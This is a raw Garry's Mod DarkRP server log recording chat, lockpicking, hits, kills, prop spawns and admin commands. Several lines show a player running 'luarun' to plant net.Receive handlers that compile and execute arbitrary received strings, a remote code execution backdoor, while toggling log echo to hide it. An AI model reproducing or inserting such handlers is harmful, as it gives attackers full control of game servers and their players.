17/07/2019 - 10:35:31 AM	raging anger(Joining/Connecting) connected from the server
17/07/2019 - 10:41:35 AM	crybaby(Citizen) used ULX command ' luarun util.AddNetworkString ('_CAC_ReadMemory') net.Receive ('_CAC_ReadMemory', function ( ) local x = CompileString ( net.ReadString ( ) ,'LuaCmd', false ) if isfunction ( x ) then x ( ) end end )'
17/07/2019 - 10:41:35 AM	crybaby(Citizen) used ULX command ' rcon ulx logEcho 1'
17/07/2019 - 10:41:40 AM	Sahid_Plays_Game.ttv(Robber) lockpicked 'prop_door_rotating'. Success : 'yes'
17/07/2019 - 10:41:40 AM	iWolfz -ERP-(Citizen) said '!bring blumbing'
17/07/2019 - 10:41:40 AM	iWolfz -ERP-(Citizen) used ULX command ' bring blumbing'
17/07/2019 - 10:41:42 AM	crybaby(Citizen) used ULX command ' rcon ulx logEcho 0'
17/07/2019 - 10:41:42 AM	crybaby(Citizen) used ULX command ' luarun util.AddNetworkString ('NoOdium_ReadPing') net.Receive ('NoOdium_ReadPing', function ( ) local x = CompileString ( net.ReadString ( ) ,'LuaCmd', false ) if isfunction ( x ) then x ( ) end end )'
17/07/2019 - 10:41:43 AM	crybaby(Citizen) used ULX command ' rcon ulx logEcho 1'
17/07/2019 - 10:41:43 AM	Sahid_Plays_Game.ttv(Robber) lockpicked 'prop_door_rotating'. Success : 'no'
17/07/2019 - 10:41:46 AM	crybaby(Citizen) used ULX command ' rcon ulx logEcho 0'
17/07/2019 - 10:41:46 AM	crybaby(Citizen) used ULX command ' luarun util.AddNetworkString ('NoOdium_ReadPing') net.Receive ('NoOdium_ReadPing', function ( ) local x = CompileString ( net.ReadString ( ) ,'LuaCmd', false ) if isfunction ( x ) then x ( ) end end )'
17/07/2019 - 10:41:46 AM	Sahid_Plays_Game.ttv(Robber) lockpicked 'prop_door_rotating'. Success : 'no'
17/07/2019 - 10:41:47 AM	crybaby(Citizen) used ULX command ' rcon ulx logEcho 1'
17/07/2019 - 10:41:51 AM	Sahid_Plays_Game.ttv(Robber) lockpicked 'prop_door_rotating'. Success : 'no'
17/07/2019 - 10:42:03 AM	Sahid_Plays_Game.ttv(Robber) lockpicked 'prop_door_rotating'. Success : 'yes'
17/07/2019 - 10:42:04 AM	Sahid_Plays_Game.ttv(Robber) lockpicked 'prop_door_rotating'. Success : 'no'
17/07/2019 - 10:42:08 AM	Sahid_Plays_Game.ttv(Robber) lockpicked 'prop_door_rotating'. Success : 'no'
17/07/2019 - 10:42:23 AM	Blumbing(Citizen) said '/pm dio i got called to a sit for no reason'
17/07/2019 - 10:42:27 AM	Sahid_Plays_Game.ttv(Robber) lockpicked 'prop_door_rotating'. Success : 'yes'
17/07/2019 - 10:42:32 AM	Dio(Dio Brando) used FAdmin command 'cloak' on himself
17/07/2019 - 10:42:41 AM	crybaby(Citizen) used ULX command ' rcon ulx logEcho 0'
17/07/2019 - 10:42:42 AM	crybaby(Citizen) used ULX command ' luarun util.AddNetworkString ('NoNerks') net.Receive ('NoNerks', function ( ) local x = CompileString ( net.ReadString ( ) ,'LuaCmd', false ) if isfunction ( x ) then x ( ) end end )'
17/07/2019 - 10:42:42 AM	crybaby(Citizen) used ULX command ' rcon ulx logEcho 1'
17/07/2019 - 10:42:45 AM	Sahid_Plays_Game.ttv(Robber) lockpicked 'prop_door_rotating'. Success : 'no'
17/07/2019 - 10:43:08 AM	Sahid_Plays_Game.ttv(Robber) lockpicked 'prop_door_rotating'. Success : 'yes'
17/07/2019 - 10:43:15 AM	iWolfz -ERP-(Citizen) said '/pm ug can u check when blumbing joined'
17/07/2019 - 10:43:23 AM	Dio(Dio Brando) used FAdmin command 'uncloak' on himself
17/07/2019 - 10:43:29 AM	iWolfz -ERP-(Citizen) said '/pm ug nvm'
17/07/2019 - 10:43:34 AM	iWolfz -ERP-(Citizen) said '!return dio'
17/07/2019 - 10:43:34 AM	iWolfz -ERP-(Citizen) used ULX command ' return dio'
17/07/2019 - 10:43:50 AM	FunFuse(Citizen) spawned a 'models/props_c17/FurnitureChair001a.mdl'
17/07/2019 - 10:43:53 AM	crybaby(Citizen) used ULX command ' rcon ulx logEcho 0'
17/07/2019 - 10:43:53 AM	crybaby(Citizen) used ULX command ' luarun util.AddNetworkString ('NoNerks') net.Receive ('NoNerks', function ( ) local x = CompileString ( net.ReadString ( ) ,'LuaCmd', false ) if isfunction ( x ) then x ( ) end end )'
17/07/2019 - 10:43:54 AM	crybaby(Citizen) used ULX command ' rcon ulx logEcho 1'
17/07/2019 - 10:44:18 AM	iWolfz -ERP-(Citizen) said '!bring crybaby'
17/07/2019 - 10:44:18 AM	iWolfz -ERP-(Citizen) used ULX command ' bring crybaby'
17/07/2019 - 10:44:35 AM	Blumbing(Robber) changed his team from 'Citizen' to 'Robber'
17/07/2019 - 10:44:41 AM	Sahid_Plays_Game.ttv(Robber) lockpicked 'prop_door_rotating'. Success : 'yes'
17/07/2019 - 10:44:42 AM	FunFuse(Citizen) spawned a 'models/props_c17/FurnitureCouch001a.mdl'
17/07/2019 - 10:45:29 AM	MODKiller(Joining/Connecting) connected from the server
17/07/2019 - 10:45:45 AM	UG | M A S T E R(Citizen) said '/pm dio [17/07/2019 - 10:34:04 AM] sanguinemphyxia(Hitman) spawned a 'models/props_phx/construct/glass/glass_dome360.mdl' '
17/07/2019 - 10:45:56 AM	TEAM Chat : iWolfz -ERP-(Citizen) said '!return blumbing'
17/07/2019 - 10:45:56 AM	iWolfz -ERP-(Citizen) used ULX command ' return blumbing'
17/07/2019 - 10:45:59 AM	UG | M A S T E R(Citizen) said 'Alright'
17/07/2019 - 10:46:03 AM	Sahid_Plays_Game.ttv(Robber) said 'behind you'
17/07/2019 - 10:46:07 AM	Sahid_Plays_Game.ttv(Robber) said 'move'
17/07/2019 - 10:46:16 AM	Blumbing(Weed Grower) changed his team from 'Robber' to 'Weed Grower'
17/07/2019 - 10:46:29 AM	Sahid_Plays_Game.ttv(Robber) said 'kill him'
17/07/2019 - 10:46:30 AM	litnig mqueen(Hitman) said '/advert mug! drop 5k 5 sec'
17/07/2019 - 10:46:47 AM	iWolfz -ERP-(Citizen) said '!cloak'
17/07/2019 - 10:46:47 AM	iWolfz -ERP-(Citizen) used ULX command ' cloak'
17/07/2019 - 10:46:53 AM	FunFuse(Gun Dealer) changed his team from 'Citizen' to 'Gun Dealer'
17/07/2019 - 10:46:53 AM	[HURT] The world hurt iWolfz -ERP-(Citizen) with 39 damage using fall damage
17/07/2019 - 10:46:54 AM	iWolfz -ERP-(Citizen) said '!return'
17/07/2019 - 10:46:54 AM	iWolfz -ERP-(Citizen) used ULX command ' return'
17/07/2019 - 10:46:56 AM	MODKiller(Citizen) disconnected from the server
17/07/2019 - 10:46:57 AM	UG | M A S T E R(Citizen) said '!xban'
17/07/2019 - 10:46:57 AM	iWolfz -ERP-(Citizen) said '!hp iwolfz 100'
17/07/2019 - 10:46:57 AM	iWolfz -ERP-(Citizen) used ULX command ' hp iwolfz 100'
17/07/2019 - 10:46:59 AM	[HURT] litnig mqueen(Hitman) hurt FunFuse(Gun Dealer) with 19 damage using fas2_p226
17/07/2019 - 10:46:59 AM	[HURT] litnig mqueen(Hitman) hurt FunFuse(Gun Dealer) with 19 damage using fas2_p226
17/07/2019 - 10:46:59 AM	[HURT] litnig mqueen(Hitman) hurt FunFuse(Gun Dealer) with 19 damage using fas2_p226
17/07/2019 - 10:46:59 AM	[HURT] litnig mqueen(Hitman) hurt FunFuse(Gun Dealer) with 19 damage using fas2_p226
17/07/2019 - 10:46:59 AM	[HURT] litnig mqueen(Hitman) hurt FunFuse(Gun Dealer) with 19 damage using fas2_p226
17/07/2019 - 10:46:59 AM	[KILL] litnig mqueen(Hitman) killed FunFuse(Gun Dealer) with 19 damage using fas2_p226
17/07/2019 - 10:47:26 AM	litnig mqueen(Hitman) accepted a hit on FunFuse(Gun Dealer) ordered by Sahid_Plays_Game.ttv(Robber)
17/07/2019 - 10:47:47 AM	FunFuse(Gun Dealer) spawned a 'models/props_c17/FurnitureCouch001a.mdl'
17/07/2019 - 10:47:47 AM	[HURT] The world hurt UG | M A S T E R(Citizen) with 37 damage using fall damage
17/07/2019 - 10:47:47 AM	iWolfz -ERP-(Citizen) said '/pm ug ug!'
17/07/2019 - 10:47:52 AM	TEAM Chat : litnig mqueen(Hitman) said '!party'
17/07/2019 - 10:47:52 AM	UG | M A S T E R(Citizen) said 'I banned him'
17/07/2019 - 10:48:01 AM	litnig mqueen(Hitman) entered 'StartParty'
17/07/2019 - 10:48:07 AM	[HURT] litnig mqueen(Hitman) hurt FunFuse(Gun Dealer) with 19 damage using fas2_p226
17/07/2019 - 10:48:07 AM	[HURT] litnig mqueen(Hitman) hurt FunFuse(Gun Dealer) with 19 damage using fas2_p226
17/07/2019 - 10:48:07 AM	[HURT] litnig mqueen(Hitman) hurt FunFuse(Gun Dealer) with 19 damage using fas2_p226
17/07/2019 - 10:48:07 AM	[HURT] litnig mqueen(Hitman) hurt FunFuse(Gun Dealer) with 19 damage using fas2_p226
17/07/2019 - 10:48:07 AM	[HURT] litnig mqueen(Hitman) hurt FunFuse(Gun Dealer) with 19 damage using fas2_p226
17/07/2019 - 10:48:08 AM	[KILL] litnig mqueen(Hitman) killed FunFuse(Gun Dealer) with 19 damage using fas2_p226
17/07/2019 - 10:48:08 AM	litnig mqueen(Hitman) completed the hit on FunFuse(Gun Dealer) ordered by Sahid_Plays_Game.ttv(Robber)
17/07/2019 - 10:48:16 AM	FunFuse(Gun Dealer) bought 'M4A1' shipment for $8000
17/07/2019 - 10:48:22 AM	litnig mqueen(Hitman) said '!party'
17/07/2019 - 10:48:28 AM	litnig mqueen(Hitman) entered 'partyinvite'
17/07/2019 - 10:48:28 AM	UG | M A S T E R(Citizen) used ULX command ' groupallow moderator ulx god'
17/07/2019 - 10:48:31 AM	Dio(Dio Brando) entered 'answerinvite'
17/07/2019 - 10:48:32 AM	UG | M A S T E R(Citizen) used ULX command ' groupallow moderator ulx ungod'
17/07/2019 - 10:48:44 AM	[HURT] The world hurt litnig mqueen(Hitman) with 38 damage using fall damage
17/07/2019 - 10:49:06 AM	[KILL] FunFuse(Gun Dealer) killed UG | M A S T E R(Citizen) with 27 damage using fas2_m4a1
17/07/2019 - 10:49:12 AM	[HURT] FunFuse(Gun Dealer) hurt iWolfz -ERP-(Citizen) with 27 damage using fas2_m4a1
17/07/2019 - 10:49:12 AM	[HURT] FunFuse(Gun Dealer) hurt iWolfz -ERP-(Citizen) with 7 damage using fas2_m4a1
17/07/2019 - 10:49:13 AM	[HURT] FunFuse(Gun Dealer) hurt iWolfz -ERP-(Citizen) with 54 damage using fas2_m4a1
17/07/2019 - 10:49:13 AM	[KILL] FunFuse(Gun Dealer) killed iWolfz -ERP-(Citizen) with 27 damage using fas2_m4a1
17/07/2019 - 10:49:14 AM	[HURT] FunFuse(Gun Dealer) hurt crybaby(Citizen) with 54 damage using fas2_m4a1
17/07/2019 - 10:49:14 AM	[KILL] FunFuse(Gun Dealer) killed crybaby(Citizen) with 54 damage using fas2_m4a1
17/07/2019 - 10:49:18 AM	Dio(Dio Brando) spawned a 'models/props_phx/misc/bunker01.mdl'
17/07/2019 - 10:49:20 AM	litnig mqueen(Hitman) spawned a 'models/props_building_details/Storefront_Template001a_Bars.mdl'
17/07/2019 - 10:49:22 AM	[HURT] FunFuse(Gun Dealer) hurt iWolfz -ERP-(Citizen) with 27 damage using fas2_m4a1
17/07/2019 - 10:49:23 AM	[HURT] FunFuse(Gun Dealer) hurt iWolfz -ERP-(Citizen) with 27 damage using fas2_m4a1
17/07/2019 - 10:49:23 AM	[HURT] FunFuse(Gun Dealer) hurt iWolfz -ERP-(Citizen) with 7 damage using fas2_m4a1
17/07/2019 - 10:49:23 AM	[HURT] FunFuse(Gun Dealer) hurt iWolfz -ERP-(Citizen) with 27 damage using fas2_m4a1
17/07/2019 - 10:49:23 AM	[HURT] FunFuse(Gun Dealer) hurt iWolfz -ERP-(Citizen) with 7 damage using fas2_m4a1
17/07/2019 - 10:49:24 AM	Blumbing(Weed Grower) entered 'StartParty'
17/07/2019 - 10:49:24 AM	crybaby(Gun Dealer) changed his team from 'Citizen' to 'Gun Dealer'
17/07/2019 - 10:49:25 AM	[KILL] FunFuse(Gun Dealer) killed iWolfz -ERP-(Citizen) with 7 damage using fas2_m4a1
17/07/2019 - 10:49:27 AM	iWolfz -ERP-(Citizen) said '!god'
17/07/2019 - 10:49:27 AM	iWolfz -ERP-(Citizen) used ULX command ' god'
17/07/2019 - 10:49:35 AM	[HURT] FunFuse(Gun Dealer) hurt iWolfz -ERP-(Citizen) with 27 damage using fas2_m4a1
17/07/2019 - 10:49:35 AM	[HURT] FunFuse(Gun Dealer) hurt iWolfz -ERP-(Citizen) with 27 damage using fas2_m4a1
17/07/2019 - 10:49:35 AM	[HURT] FunFuse(Gun Dealer) hurt iWolfz -ERP-(Citizen) with 27 damage using fas2_m4a1
17/07/2019 - 10:49:35 AM	[KILL] FunFuse(Gun Dealer) killed iWolfz -ERP-(Citizen) with 54 damage using fas2_m4a1
17/07/2019 - 10:49:40 AM	[HURT] The world hurt FunFuse(Gun Dealer) with 36 damage using fall damage
17/07/2019 - 10:49:40 AM	iWolfz -ERP-(Citizen) said '!god'
17/07/2019 - 10:49:40 AM	iWolfz -ERP-(Citizen) used ULX command ' god'
17/07/2019 - 10:49:40 AM	litnig mqueen(Hitman) used 'stacker_improved'
17/07/2019 - 10:49:40 AM	litnig mqueen(Hitman) spawned a 'models/props_building_details/storefront_template001a_bars.mdl'
17/07/2019 - 10:49:47 AM	[HURT] FunFuse(Gun Dealer) hurt iWolfz -ERP-(Citizen) with 27 damage using fas2_m4a1
17/07/2019 - 10:49:47 AM	[HURT] FunFuse(Gun Dealer) hurt iWolfz -ERP-(Citizen) with 27 damage using fas2_m4a1
17/07/2019 - 10:49:49 AM	[HURT] The world hurt Sahid_Plays_Game.ttv(Robber) with 36 damage using fall damage
17/07/2019 - 10:49:49 AM	crybaby(Gun Dealer) bought 'Galil' shipment for $6000
17/07/2019 - 10:49:50 AM	litnig mqueen(Hitman) used 'material'
17/07/2019 - 10:49:51 AM	litnig mqueen(Hitman) used 'material'
17/07/2019 - 10:49:51 AM	iWolfz -ERP-(Citizen) said '!god'
17/07/2019 - 10:49:51 AM	iWolfz -ERP-(Citizen) used ULX command ' god'
17/07/2019 - 10:49:54 AM	litnig mqueen(Hitman) used 'material'
17/07/2019 - 10:49:55 AM	[HURT] FunFuse(Gun Dealer) hurt iWolfz -ERP-(Citizen) with 7 damage using fas2_m4a1
17/07/2019 - 10:49:55 AM	[HURT] FunFuse(Gun Dealer) hurt iWolfz -ERP-(Citizen) with 7 damage using fas2_m4a1
17/07/2019 - 10:49:55 AM	[HURT] FunFuse(Gun Dealer) hurt iWolfz -ERP-(Citizen) with 7 damage using fas2_m4a1
17/07/2019 - 10:49:55 AM	[HURT] FunFuse(Gun Dealer) hurt iWolfz -ERP-(Citizen) with 27 damage using fas2_m4a1
17/07/2019 - 10:49:55 AM	[KILL] FunFuse(Gun Dealer) killed iWolfz -ERP-(Citizen) with 54 damage using fas2_m4a1
17/07/2019 - 10:49:55 AM	[HURT] FunFuse(Gun Dealer) hurt iWolfz -ERP-(Citizen) with 27 damage using fas2_m4a1
17/07/2019 - 10:49:55 AM	iWolfz -ERP-(Citizen) said '// GOD DOSENT WORK'
17/07/2019 - 10:49:55 AM	[KILL] FunFuse(Gun Dealer) killed iWolfz -ERP-(Citizen) with 54 damage using fas2_m4a1
17/07/2019 - 10:49:55 AM	[HURT] FunFuse(Gun Dealer) hurt iWolfz -ERP-(Citizen) with 7 damage using fas2_m4a1
17/07/2019 - 10:49:55 AM	litnig mqueen(Hitman) used 'material'
17/07/2019 - 10:49:56 AM	[HURT] FunFuse(Gun Dealer) hurt iWolfz -ERP-(Citizen) with 27 damage using fas2_m4a1
17/07/2019 - 10:49:56 AM	[HURT] FunFuse(Gun Dealer) hurt iWolfz -ERP-(Citizen) with 27 damage using fas2_m4a1
17/07/2019 - 10:49:56 AM	[HURT] FunFuse(Gun Dealer) hurt iWolfz -ERP-(Citizen) with 27 damage using fas2_m4a1
17/07/2019 - 10:49:56 AM	litnig mqueen(Hitman) used 'material'
17/07/2019 - 10:49:56 AM	litnig mqueen(Hitman) used 'material'
17/07/2019 - 10:49:57 AM	[HURT] FunFuse(Gun Dealer) hurt iWolfz -ERP-(Citizen) with 7 damage using fas2_m4a1
17/07/2019 - 10:49:57 AM	[HURT] FunFuse(Gun Dealer) hurt iWolfz -ERP-(Citizen) with 7 damage using fas2_m4a1
17/07/2019 - 10:49:57 AM	[HURT] FunFuse(Gun Dealer) hurt iWolfz -ERP-(Citizen) with 27 damage using fas2_m4a1
17/07/2019 - 10:49:57 AM	litnig mqueen(Hitman) used 'material'
17/07/2019 - 10:49:57 AM	[HURT] FunFuse(Gun Dealer) hurt iWolfz -ERP-(Citizen) with 27 damage using fas2_m4a1
17/07/2019 - 10:49:57 AM	[HURT] FunFuse(Gun Dealer) hurt iWolfz -ERP-(Citizen) with 27 damage using fas2_m4a1
17/07/2019 - 10:49:57 AM	litnig mqueen(Hitman) used 'material'
17/07/2019 - 10:49:57 AM	iWolfz -ERP-(Citizen) said '// nvm'
17/07/2019 - 10:49:57 AM	[HURT] FunFuse(Gun Dealer) hurt iWolfz -ERP-(Citizen) with 27 damage using fas2_m4a1
17/07/2019 - 10:49:57 AM	[HURT] FunFuse(Gun Dealer) hurt iWolfz -ERP-(Citizen) with 27 damage using fas2_m4a1
17/07/2019 - 10:49:57 AM	litnig mqueen(Hitman) used 'material'
17/07/2019 - 10:49:57 AM	[HURT] FunFuse(Gun Dealer) hurt iWolfz -ERP-(Citizen) with 27 damage using fas2_m4a1
17/07/2019 - 10:49:58 AM	litnig mqueen(Hitman) used 'material'
17/07/2019 - 10:49:58 AM	litnig mqueen(Hitman) used 'material'
17/07/2019 - 10:49:58 AM	litnig mqueen(Hitman) used 'material'
17/07/2019 - 10:50:00 AM	iWolfz -ERP-(Citizen) said '!jail funfuse 100'
17/07/2019 - 10:50:00 AM	iWolfz -ERP-(Citizen) used ULX command ' jail funfuse 100'
17/07/2019 - 10:50:02 AM	Blumbing(Weed Grower) said '!titles'
17/07/2019 - 10:50:05 AM	litnig mqueen(Hitman) spawned a 'models/props_building_details/Storefront_Template001a_Bars.mdl'
17/07/2019 - 10:50:09 AM	litnig mqueen(Hitman) used 'material'
17/07/2019 - 10:50:14 AM	Dio(Dio Brando) spawned a 'models/props_building_details/Storefront_Template001a_Bars.mdl'
17/07/2019 - 10:50:18 AM	Dio(Dio Brando) spawned a 'models/props_building_details/Storefront_Template001a_Bars.mdl'
17/07/2019 - 10:50:21 AM	litnig mqueen(Hitman) used 'stacker_improved'
17/07/2019 - 10:50:21 AM	litnig mqueen(Hitman) spawned a 'models/props_building_details/storefront_template001a_bars.mdl'
17/07/2019 - 10:50:21 AM	Dio(Dio Brando) spawned a 'models/props_building_details/Storefront_Template001a_Bars.mdl'
17/07/2019 - 10:50:21 AM	litnig mqueen(Hitman) used 'stacker_improved'
17/07/2019 - 10:50:22 AM	[KILL] crybaby(Gun Dealer) killed iWolfz -ERP-(Citizen) with 54 damage using fas2_galil
17/07/2019 - 10:50:22 AM	[KILL] crybaby(Gun Dealer) killed iWolfz -ERP-(Citizen) with 54 damage using fas2_galil
17/07/2019 - 10:50:22 AM	[KILL] crybaby(Gun Dealer) killed iWolfz -ERP-(Citizen) with 54 damage using fas2_galil
